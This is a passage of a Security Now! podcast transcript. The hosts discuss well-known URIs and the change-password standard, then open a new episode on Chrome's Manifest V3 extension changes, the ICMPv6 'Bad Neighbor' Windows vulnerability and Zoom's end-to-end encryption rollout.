LEO:  Because they're free.  They're free to you and me.



STEVE:  Yes, yes.  So anyway, doesn't look like the next 45 books will be available there.  He's been talking about finding some other way to distribute his eBooks.  And no one cares.  If we have to go somewhere else, we will.  The fans of this series have made it clear to him that we'll pay whatever reasonable price he wants to charge, no matter where that is.  So anyway, I just wanted to - for anyone who's been reading, I know that John has been following the series and liking them, and I've got several family members who are.  It's just wonderful, wonderful sci-fi space opera. 



LEO:  Uniform Resource Locator.



STEVE:  Yes.



LEO:  But I hear URI as kind of a more generic term, Uniform Resource...



STEVE:  Identifier.



LEO:  Identifier.



STEVE:  And while you were doing that, I just created GRC's shortcut for the week, and it's a perfect explanation of the differences.  So grc.sc/788.



LEO:  Okay.  Should I read it out loud?



STEVE:  No, just...



LEO:  I'll pull it up.



STEVE:  You type that in.



LEO:  Okay.  So a visual?



STEVE:  Yes, it's visual, sorry.



LEO:  Oh, good.  Okay.  Wait a minute, did I get the wrong one?  Port Authority database.  No, that's...



STEVE:  Oh, yeah.  You don't want that.  Grc.sc.



LEO:  Oh, .sc, that's why.



STEVE:  Shortcut, yup.



LEO:  I did GRC.com, dummy.



STEVE:  Yeah, that would take you to port number 788.



LEO:  Yes.  I typed everything right.  Oh, is that what it did?  Oh, that's clever.  By the way, I replaced all my stuff with Ubiquiti gear at home.  And of course first thing you do, you put a new router - a new router, new switches, new every sort of thing.  First thing you do, you go to ShieldsUP!, green.



STEVE:  Nice.



LEO:  I've never seen so much green in my life.



STEVE:  Nice.  A field of green.



LEO:  It made me feel really good.  I thought, oh.  I have to say, and I know you were the one who introduced me to this stuff, you've been telling me about the Edge Router X for a long time, this is the big boy.  I don't know why I'm having trouble.  Grc.sc; right?



STEVE:  Yup.  Forward slash.



LEO:  788.



STEVE:  788.



LEO:  There we go.  Oh, we've got to zoom in on this sucker.  All right.  I'll make it bigger.  Make it bigger.  Here we go.



STEVE:  Yeah, I just found it there on the fly.  But it does, it makes this very clear how URN, URL, and URI relate to each other.



LEO:  So the URI is the whole thing.



STEVE:  Yes, it's the...



LEO:  The URL is just the page you're going to, minus any additional qualifiers; right?



STEVE:  Correct.  Which there they call the resource.



LEO:  So for instance, grc.sc/788?, you know, query equals 53.  Everything before the question mark's a URL.  The full thing, including the query, is the URI.



STEVE:  Right.



LEO:  What's the URN?  Oh, that's minus the protocol.



STEVE:  Correct.  It does not have the URL scheme.  So anyway, so URI sort of being the more technically correct generic term.



LEO:  It's the full address, everything.



STEVE:  Of which URLs are a subset.



LEO:  Right.



STEVE:  So, okay.  As I mentioned at the top, this discussion about well-known URIs was first triggered by a new feature in Chrome 86.  So let me talk about that.  What's just been added to Chrome 86 is the so-called well-known URI change password standard.  That is, support for that.  What Google said was, starting with 86, Chrome's safety check supports the .well-known/change-password standard.  This is a W3C standard that allows websites to specify the URL where users can go to change their passwords.  So Chrome 86 adding support for the standard means that users would, for example, be able to press a button in the Chrome password settings screen and be taken directly to that page for that site to change their password right away.



In other words, this is a means for a website to universally and in a standards-compliant fashion tell browsers where to take their users who wish to change their password at that site.  Which is just too cool.  In my mind, it's another of those perfect compromise solutions that provides a startling amount of benefit at very little cost.  And we just talked about that, that GPC.  GPC is another perfect example.  It is also part of the standard.  So the beginning of the URL is always - it's always from the root, so it'll be /.well-known.  So everything downstream in the URL of .well-known is reserved.  That name space within a server is reserved by the IANA.  And password-change is a defined token of that, as is GPC.  So if a browser pulls .well-known/gpc, that's an automated universal standardized way of learning whether that site supports this emerging GPC standard.



And this is sort of like one of the Wild West aspects of the World Wide Web has been that anyone could design a website pretty much any way they chose.  There were, like, no rules.  The one convention in the beginning was that the root of a domain would contain like the default index or landing page.  But even that could be whatever the webmaster desired.  Sometimes it was index.html or .htm or default or whatever.  And if it were only ever people who were visiting, that would be fine.  But it wasn't long before it occurred to someone that bots could be created to mimic people's actions as they browsed a site.  Starting from that site's root page, which was a well-known, that was like the one predefined URL for any site, and then following the links from that page just like a person might.



So of course this quickly became known as spidering since a bot was crawling around on the web.  And the trouble was the first bots were not very smart.  They would sometimes get lost, do dumb things, start looping, issue dumb and sometimes expensive queries or whatever.  And sometimes they, like, would slam a site with queries far too fast for the site to handle.



So the first divergence from that pure "anything goes" ad hoc design of websites was the agreement about the universal robots.txt file, which webmasters all know about.  By universal agreement, a text file named robots.txt would be placed on the root of any site wishing to control the actions of any bots that might enter the site.  The robots.txt file would specify which areas a bot might go and which regions were off limits to a bot.  It even provided for bot-specific behavior by matching rules against the bot's user-agent header.  And of course a bot's adherence to robots.txt was entirely optional.  But well-behaved bots would, often for their own sake, abide by the file's requests.



So the website's root, followed by /robots.txt, those were the first instances of so-called well-known URIs.  But the concept was so useful as we move more toward automation that the World Wide Web Consortium has, as I've said, formalized, standardized, and hugely expanded upon this feature.  The work on this began 10 years ago, back in 2010, with RFC 5785, which was titled "Defining Well-Known Universal Resource Identifiers," and its abstract could hardly be shorter.  It said:  "This memo defines a standard path prefix for well-known locations," and then it says "/.well-known/" in selected Uniform Resource Identifier schemes.  Then just this last, actually the May before last, May of 2019, that RFC was formally obsoleted with 8615.  That RFC defines the function of all of this.



And basically it's just what I've described.  It's a formal, well-known URI beginning with .well-known, which reserves that name space of a server's total URL space, which it's free to do anything else with.  And by convention, for example, in the case of the /change-password query, none of these directly return contents.  Instead, they always return a redirect to the URL of the site where that resource is located, rather than, for example, being the password-change page.  Instead, any query to that password-change URL returns one of the several temporary redirect codes.



The W3C has a GitHub page where they talk about web application security change password.  And they said:  "Client-side password management software helps improve both the security and usability of websites which require authentication.  It improves security by reducing cross-site password reuse, and enhances usability by providing autofill functionality."  In other words, a fancy way of saying password managers are good.



Then they said:  "Sites currently lack a way to programmatically advertise where a user can change their password.  By proposing a well-known URL for changing passwords, this specification enables password managers to help users change their passwords on sites which support it.  Servers should redirect HTTP requests for an origin's change password URL to the actual page on which users may change their password by returning a response with a redirect status of 302, 303, or 307, and a Location header.  Clients must handle such redirects when requesting a change password URL."



And note that all three of those are temporary redirects.  The reason you want to use a temporary is that proxies and some browsers will, trying to be helpful, cache a permanent redirect so that they don't even follow the redirect the second time they get the URL.  If they've cached it, they just immediately go to where the redirect pointed them the first time they encountered it, which is a problem because webmasters might want to change, for example, where their change password page is, and then they would change where the change the well-known change-password URL redirected browsers.  So you want to make it temporary.



And that's really all there is.  The adoption of this would be very cool.  Even in the absence of a password manager, a user's web browser could, when you visit a site, much as web browsers now go and get the favicon from the root, right, in order to give the site's icon in the browser tab or in a shortcut or a bookmark if you create one, they could also check to see is a well-known change-password URL defined.  And if so, they could light up a little button on the browser's user interface Chrome, or maybe like add it to the dropdown top-level menu for the browser so that when you click on the menu, when you're on a site, it could show you a "Change your password for this site."  And if you clicked it, it would immediately take you to that site's password change page which had been set up for exactly this purpose.  So just a very cool facility.



And similarly, this GPC has a well-known URL, and there's a whole bunch of them.  As I mentioned, they are IANA-reserved URIs.  Anybody can go and license one, like reserve and register one that they want to use for their purpose.  I scanned through them, and there's just, you know, a bunch of them.  Some of them are very application-specific.  I've got no idea what many of them are.  But what we are beginning to see now is a standardized way, sort of an extension of what used to be robots.txt, but for all kinds of applications, which allows us to better automate the interaction of the clients that we're using with the sites and servers that we go to.  So just very cool.



LEO:  Well, very interesting.



STEVE:  Yup.  Something just sort of crept up on us without lots of people being aware of it.  So I just wanted to put it on everybody's radar.



LEO:  Yeah, yeah.  Yeah, really cool.  Well, we'll probably see those pop-ups at some point; right?



STEVE:  Yeah.  So certainly I would imagine our password managers will adopt it quickly because it provides them with a means of immediately taking the user to a page offered by a site.  And we'll go from there, I think.



LEO:  Yeah, yeah.  Really cool.  As always, Steve keeps us up on the latest technology.  That's why this is a must-listen show.  You'll find copies of the show at his website, GRC.com.  That's where you'll also find SpinRite, his bread and butter, the world's finest hard drive maintenance and recovery utility, 6.0, soon to be 6.1.  You want to participate, buy today, you'll be automatically upgraded, and you can participate in the testing and so forth.  GRC.com.  16Kb versions of this show for people who really have no bandwidth.  They're a little scratchy-sounding, but hey, they're there.  There's also a transcript.  I think that's probably the smallest version of the show, a nice text transcript.  You can read along as you listen.  He also has 64Kb audio.



We have audio and video at our website at TWiT.tv/sn.  That's another way you can get it.  Or you can go to YouTube.  There's a Security Now! channel on YouTube.  But do, if you are listening, watching the YouTube version, hit the Subscribe button, smash the bell, ring the bell, as they say, so that you can be notified when there's a new episode.  That's actually one of the great things about podcasts.  On-demand versions of this show are available anywhere you get your podcasts.  All you have to do is sign up.  It's free, you know, get the podcast app.  Search for Security Now!.  "Subscribe" I guess is the better word, although that always implies payment to me.  So whatever it is, press the button.  Automatically...



STEVE:  Register.  No.



LEO:  Register.  That's not it, either.  There's no real good word for this.



STEVE:  Yeah.



LEO:  "Subscribe" implies payment.  There is no payment.  It's free.  But do press the "Subscribe" button, and that way you'll have every episode the minute it's available.  We are currently at 788.  The world-famous 789 will come back next week.



STEVE:  Yay.



LEO:  Yay.  Steve, have a wonderful week.  Have you seen, there's a new show on Fox, I think you might like it, all about a killer artificial intelligence called "NeXt."



STEVE:  Ooh, no.  I want to know about that.



LEO:  Yeah.  John Slattery stars in it.  And the tech's pretty good.  There's a lot of code on the screen.  It's Python.  But other than that, at least it's not JavaScript.  It could be worse.



STEVE:  What's the name of the show?  



LEO:  It's called "NeXt," N-E-X-T.  And it just debuted last week.  So your first episode came out.  But you should be able to get that on-demand on Hulu or wherever you get your shows on-demand.



STEVE:  Cool.



LEO:  "NeXt," N-E-X-T.  It's a killer AI.  Who doesn't love that?



STEVE:  Ooh.  Yeah, I mean, I miss Daniel Suarez.  We haven't had a really good...



LEO:  I know.



STEVE:  Now, those were great books.



LEO:  This is a little Suarez-y, actually.  It's pretty good.  I'm enjoying it.  Again, on the basis of one episode.  Thank you, sir.  And we'll see you next week.  Have a great week.  See you next time on Security Now!.



STEVE:  Okay, my friend.  Bye.



LEO:  Bye-bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#789

DATE:		October 20, 2020

TITLE:		Anatomy of a Ryuk Attack

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-789.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine the coming controversial changes to the WebExtensions API.  We look at the revelations and fallout from last week's Patch Tuesday, and at Zoom's latest announcement of this week's rollout of end-to-end encryption.  We make sure everyone knows about the latest horrific SonicWall vulnerability and Microsoft's pair of not-that-worrisome, out-of-cycle patches.  We share a bit of miscellany and closing-the-loop feedback.  Then we examine an actual Ryuk ransomware intrusion and attack, step-by-step.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We're going to give you the anatomy, step by step, of a malware infection, a ransomware infection.  That's fascinating.  We'll talk about the new Edge extension specification.  Is it good for ad blockers?  We also have some information on Windows 10 God Mode.  I'll be installing that as soon as I install Windows 10.  And Zoom crypto, have they finally got it right this time?  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 789, recorded Tuesday, October 20th, 2020:  Anatomy of a Ryuk Attack.



It's time for Security Now!, the show where we gather together to celebrate security and privacy online.  It's kind of Thanksgiving for security every Tuesday with this guy right here.  I'm the turkey; he's the stuffing.  It's Mr. Steven Gibson.



STEVE GIBSON:  We're celebrating our continued existence.



LEO:  Yes.  It seems in some doubt.



STEVE:  By hook or by crook, against all odds, yes.



LEO:  Hi, Steve.  How are you?



STEVE:  Great.  Great to be with you again for Episode 789 for this lovely October 20th of 2020.



LEO:  Seven ate nine.  That's why we went right to Windows 10, actually.



STEVE:  What?



LEO:  Because seven ate nine.



STEVE:  We did skip 9.  Did we ever get a reason for why 9 got passed over?



LEO:  Because seven ate nine.  Get it?



STEVE:  What?  No.



LEO:  You obviously never went to high school.  All right, all right, all right.  He skipped straight to college.



STEVE:  In following up on some interesting news, I discovered a beautiful forensic analysis of an actual ransomware attack where the Ryuk gang, also the Ryuk ransomware was employed - and isn't that also Sodinokibi?  There's so much of it now, I'm getting kind of confused - was used to attack an enterprise.  And we have exactly how it was done, with the tools that were used, how the person jumped from machine to machine.  I just thought, okay, this is just too cool to pass up.  So I think a really interesting deep dive into a ransomware attack.



LEO:  And a cautionary tale, I mean, now that we can follow the tracks.



STEVE:  Oh, it's a little chilling, actually, when you actually - it's one thing to just say, oh, yeah, they got attacked.  But, boy, when you look at what they did, it really helps to bring it home.  But we're first going to look at some of the controversial changes coming to the WebExtensions API, which actually is now two years old.  That is, Google announced their intentions two years ago.  And Microsoft just said, yeah, we're going to be - we're, like, rolling that out this week in Edge.  We're also going to look at the revelations and fallout from last week's Patch Tuesday.  I enjoyed hearing Mary Jo say, yeah, it was only 87, you know, not such a big deal.  But it was like, wait, we used to have 10.  There used to be 10 problems.



LEO:  Well, and Microsoft had an out-of-band update this week, too.  So, I mean, crikey, yeah.



STEVE:  Yup, we're going to get to that, as well.  We also have again, you know, I just - I've decided, Leo, that we need the CEO of Zoom not to be quoted during any of their press releases because he just - everything's cruising along fine, and then he says something.



LEO:  And you go, what?  Wait.



STEVE:  It's just like, oh, no.  Well, just go take your stock options and stay away from the PR people because it was all great until he opened his mouth again.  But they're still trying with this week's rollout of end-to-end encryption.  We also want to make sure that everyone knows about the latest horrific SonicWall vulnerability, the second bad one this year.  This one's really bad.  And we also got the not-that-worrisome out-of-cycle patches from Microsoft, a little bit of miscellany, a little bit of closing-the-loop feedback.  I found a really cool utility for Windows 7, 8, and 10.  I don't know what happened to 9.  Again, this is Security Now! 789, but I'm still confused about where Windows 9 went.



LEO:  You'll wake up in the middle of the night, and you'll get it, I'm telling you.



STEVE:  Okay.  I don't think so.  And then we're going to examine this really cool analysis, the forensic walkthrough of a ransomware intrusion and attack, which concludes with every machine in the enterprise deeply encrypted.  So yes, I think another great podcast for our listeners.



LEO:  It is going to be barrels of fun and educational, to boot.  Steve, I saw somebody tweet you this Picture of the Week.  I was hoping you would use it.  I love it.



STEVE:  So this is two photos from scenes from "Star Trek:  Next Generation."  The first one shows the bridge.  And Data and Wesley are there at the front consoles, and we have Will and Deanna Troi bracketing Picard, and Worf in the background at his security station.  Everybody who knows STTNG is aware of that familiar setup.  And this shows Picard giving Data an order.  He says:  "Mr. Data, please bring the Windows 10 updates completely online."



LEO:  Uh-oh.



STEVE:  And of course things don't go well, and the next frame is like everything has exploded on the bridge.  We have sparks flying everywhere.  I don't know what happened to Deanna.  I think she already got thrown out of her chair.



LEO:  I can even hear in my mind the [voicing alarm sounds].  I can hear it.



STEVE:  Yes, yes.



LEO:  That's hysterical.



STEVE:  So, yes, the fact that people are creating these...



LEO:  It does say something, doesn't it.



STEVE:  ...images just sort of tells you what the industry - about how badly the industry has been abused by Windows 10 and its updates.  It's like, oh, my goodness.  Well, okay.  Edge is going to be updated with browser extensions known as Manifest V3.  The proposed changes to the WebExtensions API, which are sort of generically known as Manifest V3, or I guess shortly known, were first announced by Google two years ago, back in October of 2018.  And this was for Chromium.  This is what Google said, "This is what we're going to do."  And we talked about this at the time.



Our listeners may remember these stated plans from Google did not go over very well with the industry.  When they announced their planned changes, they explained, Google explained that the main intent of this Manifest V3 was to improve extension security, improve extension performance, and give users greater control over what extensions did and which sites they could interact with.  Which, you know, all sounds great.  But extension developers quickly pointed out that these Manifest V3 updates contained changes which would cripple the ability of ad blockers, AV, parental control enforcement, and various privacy-enhancing extensions to do their job as they had been.



And as a consequence, Google's announcement triggered a significant backlash from users, extension developers, and even other browser makers because, among other things, the extensions had the effect of limiting the power of ad blockers to block ads.  Of course the non-Google community was unhappy to see Google, clearly an advertising-based company, moving to limit our ability to control the ads that our browsers would be subjecting us to.  And as I've often mentioned, from time to time I will encounter a browser lacking a competent ad blocker.  And I'm always shocked by the experience.  I think, wait, whoa, buckle up.  It's just - it's horrific.  So I can imagine choosing a browser entirely based upon whether or not it allowed me to have control over just how obnoxious the ads were that I was being served.



And back at the time, browsers including Opera, Brave, and Vivaldi quickly distanced themselves from Google's plans, announcing their intentions to ignore these Manifest V3 updates and thus allow users to keep using the ad blockers that they already were using and liked.  And Mozilla, which had implemented the WebExtensions API up to that point in Firefox in order to get compatibility with where the rest of the industry was going, also explicitly denounced Chrome's plans and said it would not be following Google's WebExtensions API to the letter and would instead be making its own changes to allow ad blockers to continue working as they always have.



Now, I would argue that Google had its heart in the right place, but that they did perhaps willfully underappreciate the importance of allowing for dynamic extension-based page filtering.  Here's what happened at the technology level.  The original Web Request API, and that's what it was known, the Web Request API, allowed developers of web extensions to install complete and powerful in-line filters, both in the query and in the reply loops, sort of encircling the browser's engine.  A query filter would inspect and perhaps modify any browser queries leaving the browser on the way to remote web servers.  And a reply filter would receive remote web server replies before the browser engine saw them.  And this would allow the extension to make extensive edits of the received page, among other things blocking subsequent requests for secondary page assets like ads.



Google's V3 reengineered solution was going to discard all of that, and in fact has, in favor of what they called a "Declarative Net Request API."  And Google explained that it would prevent extensions from inspecting web requests made on a page while providing much of the same functionality.  And again, I'll say that I think Google's heart was in the right place because that pre-V3 filtering, which is what we've been living with up until now, was awesomely powerful.



Two years ago, at the time of the announcement, Simeon Vincent, who's the Developer Advocate for Chrome Extensions, said that 42% of all malicious extensions which Google had detected year to date, so from January 2018 until October 2018, 42% of all malicious extensions were abusing that API for nefarious purposes.  He said:  "With Web Request, Chrome sends all the data in a network request to the listening extension, including any sensitive data contained in that request like personal photos or emails."  He says:  "Because all of the request data is exposed to the extension, it makes it very easy for a malicious developer to abuse that access to a user's credentials, accounts, or personal information."



All of that is true.  Which is why I like the idea, if we can somehow arrange to get both; if we could have good blocking while somehow not allowing extensions that could misbehave to see everything coming and going, to and from the web browser.  So with Google's Declarative Net Request API, which is what is in the V3 next generation, an extension preregisters rules that the browser reads and then applies to each web page before and after it's loaded.  This hugely improves security and privacy since extensions never receive and see all of the page data, which they do under V2.  And then the browser makes all of the modifications requested on behalf of the extension only when one or more of those pre-declared rules are met.  And in addition to enhanced privacy and security, this allows Chrome's optimized processing paths to handle all of the actual web request filtering, rather than leaving this to an extension's possibly slow JavaScript code.  So we get a big performance boost in addition to enhanced privacy and safety.



So the problem is these changes promise to create a number of problems.  The first and most obvious was that this would be restricting what extensions were able to do.  And I don't see any way around that.  You're either going to give extensions unfettered full access to a web page; or you're going to say just tell us what things you're sensitive about, and we'll look for those for you and then take care of it.  So, for example, at the time the developers of NoScript and uBlock Origin were not happy because they liked the power that they had.  They made it clear that the new API's declarative rule system would not provide the same level of control.



But the most glaring limitation that arose at the time was the total number of rules that the new engine could accommodate.  Google planned to allow what I would think would seem like plenty of rules, 30,000.  But it was quickly revealed to be far insufficient for ad blockers.  They often have to filter web requests for hundreds of thousands of ad-related domains these days.  So during the debate which ensued, the stated requirements ranged from 90,000 to 150,000, some people even arguing that, look, let's not have a too-low limit that ad blockers could hit their heads on.  So how about half a million?  Anyway, Google compromised and did agree to raise their planned 30,000 to 150,000 individual rules.  So that's where we are, and that brings us to today.



Manifest V3 changes are now being tested in Chrome's developer channels, and much of the post-announcement grumbling from two years ago has died down, although some ad blocker extensions, the devs have given up on their product's ability to reliably block ads once these changes reach stable versions of Chrome.  And I think that may be some grumbling.  I'm kind of hoping, frankly, that Firefox, which is still my primary browser, will stay where they are and say, you know, we're going to want to be the powerful web extensions people.  They're arguably sort of the power user's browser, while Chrome continues blasting ahead, having become the mainstream browser.



And so the reason this is in the news is, aside from it being useful and important browser-side technology for us to keep abreast of, last Wednesday Microsoft said that the Manifest V3 changes would shortly be rolling out in Edge also.  I mean, you know, it's going to be what Chromium, then the Chromium browsers, have.  And anyone using Chromium would probably have to struggle to explicitly continue to support those.  Or who knows.  It might be that Chromium will disable V2, but keep it around.



Anyway, Microsoft said:  "In continuation of our commitment to reduce fragmentation of the web for all developers" - meaning let's all keep with a single API - "and to create better web compatibility for our customers, we plan to support the Declarative Net Request API and other changes proposed as part of Manifest V3."  They said:  "The decision to embrace Manifest V3 changes is based upon our dedication to enhance privacy, security, and performance for the benefit of our end users as well as to allow developers to extend and provide rich experiences in Microsoft Edge."



And I'll skip some of this because they did explicitly say that:  "We recognize the value of content-blocking extensions and appreciate the role they play in honoring users' choice by blocking advertisements and enhancing privacy by blocking cookies, and we want developers to continue to offer these capabilities."  They said:  "After an extensive review of the concerns raised by content blockers and the community, we believe that a majority of those concerns have been resolved or will be resolved before Web Request API is deprecated."  Meaning the way we've always had it until now.  And frankly, with care, maybe the way we need to keep it for some users.



So my hope is that a workable compromise has been or can be reached.  And frankly, I love the power of a full filtering ad blocker, though it does come with some serious security and privacy tradeoffs.  Again, I don't think there's a way around that.  You're either going to blind your extensions to the full content of the page and come up with like a second-level filtering rule-based approach, which is what Google has proposed two years ago, or you're going to allow extensions very powerful access and trust them.  And given our curmudgeon friend Gorhill and just who he is, I would trust him and his work, which is the way uBlock Origin is created, completely.  And I would argue that those of us who listen to this podcast know how to be cautious.  But we're also a vanishingly small minority.



So I get it.  I get what Google is trying to do.  I've seen the extension burden that some Chrome users subject their browser to.  I look at it, I think, what are all those things?  Because it's like, oh, let's add this, and let's add that.  Sooner or later you're going to add something malicious, if your approach is just to add everything that you encounter.  So it'll be interesting to see how this falls out.  I wouldn't be unhappy if Chrome deprecated V2, but then allowed you to turn it back on if you were a power user, and/or if Mozilla allowed the same capability in Firefox.  We'll just sort of have to see how it goes.



Last Tuesday, as I mentioned, Microsoft issued fixes for 87 security vulnerabilities.  So yeah, a slow month, but only when measured against everything year to date.  Those 87 fixes included a pair of critical remote code execution flaws.  Actually, I think there were 11 of them in total.  But there were two that stood out.  One was in the core Windows TCP/IP stack, and another was in Microsoft Outlook.  And I'll come back to the rest in a minute, or come back to those two in a minute.  There were also nine other critical flaws.  There were 75 ranked as important, and one classified as only being moderately important.  And of course they collectively affected Windows, Office, Office Services, Web Apps, Visual Studio, Azure, .NET Framework, Microsoft Dynamics, Open Source, Exchange Server, and the Windows Codecs Library.  And the good news is none of those are known to be under attack.  However, six of the vulnerabilities were listed as being publicly known at the time of release.  So a good thing to apply.



Now, hopefully most of our listeners will have perked up or perhaps started digging a new bunker for themselves at the mention of a core flaw in the Windows TCP/IP stack.  Those are never good.  And did I mention that this one, once it is weaponized from being merely a Blue Screen of Death crash at the moment into an active remote code execution attack, everyone who has looked at it is saying that it is 100% wormable.  So what that means is all of these instances of Windows which have any public presence on the Internet have a TCP/IP stack outwardly facing on the 'Net and are subject right now, prior to last Tuesday, to at minimum a crash.  They call it "denial of service" because if your server crashes, your service is denied.  But right now it's crashing.  That's not difficult to do.  Everyone is expecting this will mature over time.  Rapid7 and McAfee both have good write-ups about it.



Here's how McAfee summarized the situation.  They said:  "Today, Microsoft announced a critical vulnerability in the Windows IPv6 stack, which allows an attacker to send maliciously crafted packets to potentially execute arbitrary code on a remote system.  The proof of concept shared with MAPP (Microsoft Active Protection Program) members is both extremely simple and absolutely reliable.  It results in an immediate Blue Screen of Death; but more so, it indicates the likelihood of exploitation for those who can manage to bypass Windows 10 and Windows Server 2019 mitigations."  Meaning that the things that are necessary to mature this from a crash to a remote code execution, everyone is thinking it's probable.



They said:  "The effects of an exploit that would grant remote code execution would be widespread and highly impactful, as this type of bug could be made wormable."  They said:  "For ease of reference, we nicknamed the vulnerability 'Bad Neighbor' because it is located within ICMPv6 Neighbor Discovery Protocol, using the Router Advertisement type."  Now, nobody has published yet a proof of concept, but it's regarded as imminent at this point.



Rapid7 said:  "If you're in the U.S. and were waiting for an 'October surprise,' look no further than CVE-2020-16898, which is a remote code execution vulnerability in the Windows TCP/IP stack, or what our own Tod Beardsley likes to call 'exploiting poor implementations of core IETF RFCs.'"  They said:  "The vulnerability arises when the TCP/IP stack does not properly handle ICMPv6 Router Advertisement packets.  Successful exploitation requires sending specially crafted ICMPv6 Router Advertisement packets to a remote Windows computer and could give an attacker the ability to execute code on the target server or client."  It carries a CVSS v3 base severity score of 9.8 because, yeah, it's that bad.  It would be a 10 if it existed now in the wild.  If there was public proof of concept code, it would be over.  We're talking about any presence of a network, of a Windows network stack on the Internet.



So they said:  "Our talented crew of Rapid7 vulnerability researchers have a technical analysis up on AttackerKB, and security firm McAfee has their own technical analysis.  Their research and engineering teams note that the Microsoft-provided exploit is both extremely simple and perfectly reliable, and results in an immediate Blue Screen of Death."



They said:  "Before we go any further, we would like to strongly encourage you to patch this vulnerability if you are running Windows 10, Windows Server 2019, Windows Server Core 1903, 1909, or 2004.  You really don't want to mess around," they're saying, "when the word 'wormable' is being used and so many eyes are on the non-BSOD prize of a fully working RCE.  If you cannot patch, consider disabling ICMPv6 Recursive DNS Server (RDNSS) as a workaround," he said, "which is unfortunately only available for Windows 1709 and above."  On the other hand, that's all recent Windows.



And then they have a PowerShell command that I have in the show notes.  Again, it's hard to imagine that somebody has not updated, but it's only a week old, and it's really important.  And, I mean, this is a potentially Internet meltdown-scale vulnerability, if somebody figures out how to turn this into a full working remote code execution exploit.  We know that reverse engineering is now being done on a monthly basis, as soon as Microsoft updates something which is really bad, like they tried to do with Zerologon a couple months ago, and that's been a disaster.  So here we have something even potentially more serious because remember Zerologon you've got to already be in, and then you can use it to gain access to an enterprise's domain controller.  This is any Windows instance, any Windows stack exposed publicly.  Again, it's not immediately weaponized.  But everybody's working on that right now because this carrot is so big and juicy.



They said - this is Rapid7.  "As noted above, there are many folks who have access to the known BSOD exploit, and more who are currently burning through" - this is Rapid7 - "burning through cases of Mountain Dew while working to replicate the BSOD, then to weaponize the unpatched vulnerability.  In the short term, and possibly long term," they're saying, "you should be more wary of disruption and distraction campaigns using this weakness, especially since IPv6 is very likely running on your internal network, where Bad Neighbor attacks are really most likely to occur without you being aware of it."



They finish:  "You and your organization should really be prepared to have between one to five critical 'patch now' events each month for the foreseeable future.  That may seem disruptive, but the spate of critical bugs in core business and remote access technologies has become the new normal, and the only way to handle it is to make it part of the plan."



I wanted to go all the way through that because I thought what Rapid7 said was significant.  I mean, and Leo, it obviously caught your attention.  Yes, I mean, if we objectively look at how bad and how frequent these serious problems have become, it is...



LEO:  Shocking.



STEVE:  Really, it is, it is shocking. 



LEO:  Why would anybody use Windows?  It's just ridiculous.  Just stop.  Stop the insanity.  Holy cow.



STEVE:  Yeah, yeah.  Okay.  So I love that they're trying.  I headlined this in the show notes:  If at first you don't succeed, Zoom Zoom again.  Last Wednesday, Zoom announced that this week their 30-day evaluation of end-to-end encrypted video conferencing would begin.  And of course, as we know, they've pretty much blown the implicit assumption of trust we might have been willing to confer on them due to their constantly botched and incredibly miscommunicated response to their early problems and to their plans to sort of, maybe mostly, but we really want to encrypt, we think.  Okay, we got it.  But we wouldn't be fair if we didn't acknowledge what they announced last week because it does really, on its surface, sound exactly right.



Here's what Zoom said last week:  "We're excited to announce that starting next week" - which is now this week - "Zoom's end-to-end encryption offering will be available as a technical preview, which means we're proactively soliciting feedback from users for the first 30 days.  Zoom users, free and paid around the world, can host up to 200 participants in an E2EE" - that's the new acronym, end-to-end encrypted - "meeting on Zoom, providing increased privacy and security for your Zoom sessions.  We announced in May our plans to build an end-to-end-encrypted meeting option into our platform, on top of Zoom's already strong encryption and advanced security features.  We're pleased to roll out Phase 1 of 4 of our E2EE offering, which provides robust protections to help prevent the interception of decryption keys that could be used to monitor meeting content.



"To be clear," they wrote, "Zoom's E2EE uses the same powerful GCM encryption you get now in a Zoom meeting.  The only difference is where those encryption keys live."  Okay.  This all sounds good so far.  In typical meetings, Zoom's cloud generates encryption keys and distributes them to meeting participants using Zoom apps as they join.  With Zoom's E2EE, the meeting's host generates encryption keys and uses public key cryptography to distribute these keys to the other meeting participants.  Zoom's servers become oblivious relays and never see the encryption keys required to decrypt the meeting contents.  Okay.  That's, like, perfect in terms of architecture.  Unfortunately, then, Zoom's CEO had to stick his foot in an otherwise great announcement.



LEO:  Something like, let me guess, unless there's child sexual material on there, in which case we keep the keys.



STEVE:  Well, he did that before.



LEO:  Yeah.  If law enforcement needs those, then they can have them.



STEVE:  Yeah.  The announcement finishes.  "Zoom's CEO, Eric S. Yuan, said:  'End-to-end encryption is another stride toward making Zoom the most secure communications platform in the world.  This phase of our E2EE offering provides the same security as existing end-to-end encrypted messaging platforms.'"  What?  No, it doesn't.  It's like, it was better until you said that.



LEO:  You know what, I wouldn't say this is an admission of a flaw or anything like that.  I think he just doesn't - he's not a technical guy.



STEVE:  No, again, just muzzle this guy.  He always says the wrong thing.



LEO:  Yeah, yeah.



STEVE:  You know, everything was great until he just downgraded this to being as good as everything else.



LEO:  It's as good as Messenger.



STEVE:  Because everything else is not good.



LEO:  Right.  It sounds good.



STEVE:  Most of them are terrible.



LEO:  But a lot of them are not; right.



STEVE:  Yeah.  Oh, boy.  So anyway...



LEO:  If he had said, "Now we're as good as Threema," you'd go, okay.  Okay, yeah.



STEVE:  Yeah.  Unfortunately, now we're as good as the other services which manages your keys for you, after we just told you that we're not going to do that.



LEO:  Oh, boy.



STEVE:  Anyway, so the good news is they're taking - if we believe all this, they're taking the key management out of the hands of Zoom's servers and moving it to the meeting host, who then generates keys and distributes individual keys to each participant using public key crypto.



LEO:  Good.



STEVE:  That is a far more secure architecture than any centralized key distribution system which is what you get from Zoom if you don't ask for the fancy encryption.



LEO:  Right.



